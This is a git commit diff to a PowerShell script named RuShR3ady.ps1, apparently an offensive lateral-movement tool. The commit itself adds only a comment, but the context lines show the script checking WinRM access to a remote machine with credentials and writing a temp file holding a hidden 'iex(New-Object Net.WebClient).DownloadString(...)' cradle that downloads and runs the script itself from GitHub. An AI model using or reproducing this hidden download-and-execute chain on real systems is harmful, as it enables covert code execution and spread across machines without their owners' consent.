d3f25e9d7c080be88db9e5d3ae8788ea7def02e4
Securethelogs.com <54673576+securethelogs@users.noreply.github.com>
2020-05-11 00:24:34 +0100

    Update RuShR3ady.ps1

--- RuShR3ady.ps1
+++ RuShR3ady.ps1
@@ -66,6 +66,7 @@ $islive = Test-WSMan machine-1 -Credential $mycredential -Authentication Negotia
 
 if ($islive -ne $null){
 
+# **************** what if you just run a powershell invoke for each ********************
 
 New-Item -Path $env:TEMP -Name "john.ps1"
 Add-Content $env:TEMP\john.ps1 -Value 'powershell -nop -w hidden iex(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/securethelogs/Powershell/master/RuShR3ady.ps1")'
